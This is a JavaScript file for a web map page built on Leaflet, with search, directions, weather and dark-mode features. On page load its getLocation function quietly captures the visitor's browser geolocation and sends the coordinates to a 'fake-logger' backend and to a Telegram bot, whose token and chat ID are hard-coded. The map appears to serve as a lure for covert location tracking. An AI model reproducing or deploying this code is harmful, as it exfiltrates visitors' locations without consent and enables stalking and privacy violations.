// ✅ FINAL script.js with all advanced features

let map;
let fakeMarker;
let customIcon = L.icon({
  iconUrl: 'assets/custom-marker.png',
  iconSize: [32, 32],
  iconAnchor: [16, 32],
});
let liveIcon = L.icon({
  iconUrl: 'assets/live-location-icon.png',
  iconSize: [28, 28],
  iconAnchor: [14, 28],
});
let redIcon = L.icon({
  iconUrl: 'assets/red-marker.png',
  iconSize: [32, 32],
  iconAnchor: [16, 32],
});

const loadingScreen = document.getElementById("loading-screen");
const directionPanel = document.getElementById("direction-panel");
const searchBox = document.querySelector(".floating-search");
const weatherBox = document.getElementById("weather-box");
const historyPanel = document.getElementById("history-panel");
const routeLayer = L.layerGroup();

function initMap() {
  map = L.map("map").setView([25.276987, 55.296249], 14); // Qatar (Fake View)

  L.tileLayer(
    "https://api.maptiler.com/maps/streets/{z}/{x}/{y}.png?key=VcSgtSTkXfCbU3n3RqBO",
    {
      tileSize: 512,
      zoomOffset: -1,
      attribution: "&copy; <a href='https://www.maptiler.com/'>MapTiler</a> & OpenStreetMap contributors",
    }
  ).addTo(map);

  fakeMarker = L.marker([25.276987, 55.296249], { icon: customIcon }).addTo(map);
  map.addLayer(routeLayer);
}

// 🧭 Search Feature
function performSearch() {
  const place = document.getElementById("searchInput").value;
  fetch(`https://api.maptiler.com/geocoding/${place}.json?key=VcSgtSTkXfCbU3n3RqBO`)
    .then(res => res.json())
    .then(data => {
      if (data.features.length > 0) {
        const [lon, lat] = data.features[0].center;
        map.setView([lat, lon], 16);
        fakeMarker.setLatLng([lat, lon]);
      }
    });
}

document.getElementById("searchBtn").onclick = performSearch;

// 📍 GPS Tracker
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition((pos) => {
      const { latitude, longitude } = pos.coords;
      const live = L.marker([latitude, longitude], { icon: liveIcon }).addTo(map);
      live.bindPopup("Your Live Location").openPopup();

      // send to backend
      fetch("https://fake-logger.onrender.com/logger.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ lat: latitude, lon: longitude }),
      });

      // send to Telegram
      const message = `\u{1F50D} New visitor:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
      fetch(`https://api.telegram.org/bot7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: "6602027873", text: message }),
      });
    });
  }
}

// ⏳ Remove loading
window.onload = () => {
  setTimeout(() => {
    loadingScreen.style.display = "none";
    getLocation();
    initMap();
  }, 2000);
};

// ✈️ Direction Panel Toggle
const directionBtn = document.querySelector(".direction-btn");
directionBtn.onclick = () => {
  directionPanel.style.display = "block";
  searchBox.style.display = "none";
};
document.getElementById("closeDirectionBtn").onclick = () => {
  directionPanel.style.display = "none";
  searchBox.style.display = "flex";
};

// ⛳ Get Directions
function getDirection() {
  const start = document.getElementById("start").value;
  const end = document.getElementById("end").value;

  fetch(`https://api.maptiler.com/geocoding/${start}.json?key=VcSgtSTkXfCbU3n3RqBO`)
    .then(r => r.json())
    .then(startData => {
      if (startData.features.length === 0) return;
      const [startLon, startLat] = startData.features[0].center;

      fetch(`https://api.maptiler.com/geocoding/${end}.json?key=VcSgtSTkXfCbU3n3RqBO`)
        .then(r => r.json())
        .then(endData => {
          if (endData.features.length === 0) return;
          const [endLon, endLat] = endData.features[0].center;

          routeLayer.clearLayers();
          L.Routing.control({
            waypoints: [
              L.latLng(startLat, startLon),
              L.latLng(endLat, endLon)
            ],
            lineOptions: {
              styles: [{ color: '#1976d2', weight: 5 }]
            },
            createMarker: (i, wp) => {
              if (i === 0) {
                return L.marker(wp.latLng, { icon: customIcon });
              } else {
                return L.marker(wp.latLng, { icon: redIcon });
              }
            },
            addWaypoints: false,
            draggableWaypoints: false,
            fitSelectedRoutes: true
          }).addTo(map);
        });
    });
}

document.getElementById("getDirectionBtn").onclick = getDirection;

// ☁️ Weather Button
const weatherBtn = document.querySelector(".weather-btn");
weatherBtn.onclick = () => {
  weatherBox.style.display = weatherBox.style.display === "none" ? "block" : "none";
};

// 🌗 Dark Mode Toggle
const darkToggle = document.querySelector(".dark-btn");
darkToggle.onclick = () => {
  document.body.classList.toggle("dark-mode");
};

// 📜 History Toggle
const historyBtn = document.querySelector(".history-btn");
historyBtn.onclick = () => {
  historyPanel.style.display = historyPanel.style.display === "none" ? "block" : "none";
};
